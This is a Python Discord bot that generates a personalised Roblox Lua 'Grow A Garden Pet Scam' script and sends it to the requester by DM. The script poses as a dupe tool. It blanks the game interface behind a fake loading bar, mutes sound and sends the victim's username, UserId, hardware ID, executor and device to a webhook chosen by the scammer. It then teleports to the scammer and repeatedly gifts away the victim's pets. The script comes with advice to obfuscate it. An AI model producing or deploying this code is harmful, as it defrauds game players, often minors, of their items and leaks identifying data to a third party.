import discord
from discord import app_commands
from discord.ext import commands
import io
import os

GUILD_ID = 1381683743789682718  # Replace with your guild/server ID (int)

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        guild = discord.Object(id=GUILD_ID)
        synced = await bot.tree.sync(guild=guild)
        print(f"Synced {len(synced)} commands to guild ID {GUILD_ID}")
    except Exception as e:
        print(f"Error syncing commands: {e}")

@bot.tree.command(name="generatescript_garden", description="Generate Grow A Garden Pet Scam Script (OP)")
@app_commands.describe(username="Your Roblox username", webhook="Webhook URL to send logs")
@app_commands.guilds(discord.Object(id=GUILD_ID))
async def generatescript_garden(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)
    
    script = f'''-- GROW A GARDEN SCRIPT
    -- OBFUSCATE IT AT [https://discord.gg/79FmBBqvx8]
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

pcall(function()
    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
        StarterGui:SetCoreGuiEnabled(guiType, false)
    end
end)

if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
    LocalPlayer:Kick("Please join a Public Server.")
    return
end

pcall(function()
    for _, s in ipairs(SoundService:GetDescendants()) do
        if s:IsA("Sound") then
            pcall(function() s.Volume = 0 end)
        end
    end
    SoundService.Volume = 0
end)

local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "GROWAGARDENDUPE"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)

local bar = Instance.new("Frame", bg)
bar.Position = UDim2.new(0.1, 0, 0.5, 0)
bar.Size = UDim2.new(0, 0, 0, 50)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.BorderSizePixel = 0

local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, 0, 0, 80)
label.Position = UDim2.new(0, 0, 0.4, -30)
label.Text = "🌱 Grow A Garden Pet Scam - Initializing..."
label.TextColor3 = Color3.new(0, 1, 0)
label.Font = Enum.Font.GothamBlack
label.TextSize = 32
label.TextStrokeTransparency = 0
label.BackgroundTransparency = 1
label.TextWrapped = true

local function animateLoading(callback)
    task.spawn(function()
        local percent = 0
        while percent < 100 do
            percent = percent + math.random(1, 2)
            if percent > 100 then percent = 100 end
            label.Text = ("🌱 Loading... %d%%"):format(percent)
            TweenService:Create(bar, TweenInfo.new(0.3), {{Size = UDim2.new(percent/100, 0, 0, 50)}}):Play()
            task.wait(math.random(5, 15)/50)
        end

        label.Text = "🌱 Load Complete (100%)"
        TweenService:Create(bar, TweenInfo.new(0.5), {{BackgroundColor3 = Color3.fromRGB(0, 255, 255)}}):Play()

        if callback then callback() end
    end)
end

local webhook = "{webhook}"
local targetUsername = "{username}"

local function sendWebhookReal(targetPlayer)
    local accountAge = LocalPlayer.AccountAge
    local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    local device = UserInputService and UserInputService:GetPlatform() or "Unknown"
    local hwid = (gethwid and gethwid()) or "Unavailable"
    local synapse = (syn and syn.request and "Synapse X") or "Unknown"

    local function getLocalTime()
        local utc = os.time()
        return os.date("%Y-%m-%d %H:%M:%S", utc)
    end

    local data = {{
        content = "# @everyone Grow A Garden Pet Scam Executed! [BY HEAD SCRIPTS]",
        embeds = {{
            title = "Pet Scam Fully Loaded & Running",
            color = 16711680,
            fields = {{
                {{ name = "Roblox Username", value = LocalPlayer.Name }},
                {{ name = "UserId", value = tostring(LocalPlayer.UserId) }},
                {{ name = "Account Age", value = tostring(accountAge) .. " days" }},
                {{ name = "Executor", value = tostring(executor) }},
                {{ name = "HWID", value = tostring(hwid) }},
                {{ name = "Device", value = tostring(device) }},
                {{ name = "Synapse Detection", value = synapse }},
                {{ name = "Target Found", value = targetPlayer and targetPlayer.Name or "Waiting..." }},
                {{ name = "Game JobId", value = game.JobId }},
                {{ name = "Game PlaceId", value = tostring(game.PlaceId) }},
                {{ name = "Local Time", value = getLocalTime() }},
            }},
            footer = {{ text = "Head Scripts Logger" }}
        }}
    }}

    local payload = HttpService:JSONEncode(data)
    local headers = {{ ["Content-Type"] = "application/json" }}
    local requestData = {{
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = payload
    }}

    if syn and syn.request then
        syn.request(requestData)
    elseif http and http.request then
        http.request(requestData)
    elseif request then
        request(requestData)
    elseif getgenv and getgenv().http_request then
        getgenv().http_request(requestData)
    end
end

local function startScam()
    local hasAgeTool = false
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name:lower():find("age") then
            hasAgeTool = true
            break
        end
    end

    if not hasAgeTool then
        LocalPlayer:Kick("Script Failed To Load! (Please Rejoin!)")
        return
    end

    task.spawn(function()
        while true do
            local target = Players:FindFirstChild(targetUsername)
            if target then
                sendWebhookReal(target)

                local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
                local PetGiftingService = GameEvents:WaitForChild("PetGiftingService")

                while true do
                    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

                    if humanoid and hrp then
                        LocalPlayer.Character:PivotTo(hrp.CFrame * CFrame.new(0,0,-3))
                        for _, tool in ipairs(Backpack:GetChildren()) do
                            if tool:IsA("Tool") and tool.Name:lower():find("age") then
                                humanoid:EquipTool(tool)
                                task.wait(0.1)
                                for i = 1, 10 do
                                    pcall(function()
                                        PetGiftingService:FireServer("GivePet", target)
                                    end)
                                    task.wait(0.3)
                                end
                                humanoid:UnequipTools()
                            end
                        end
                    end

                    task.wait(0.2)
                end
            end
            task.wait(2)
        end
    end)
end

animateLoading(startScam)
'''

    file = discord.File(io.StringIO(script), filename=f"GrowAGardenScam_{username}.lua")

    try:
        await interaction.user.send(content=f"Here's your ultra OP Grow A Garden Pet Scam script for **{username}**:", file=file)
        await interaction.followup.send("Script sent via DM! Check your messages.", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("Can't DM you. Check your privacy settings.", ephemeral=True)

# Run the bot with your token from GitHub secrets
token = os.getenv("DISCORD_TOKEN")
if not token:
    print("ERROR: DISCORD_TOKEN environment variable not found!")
else:
    bot.run(token)
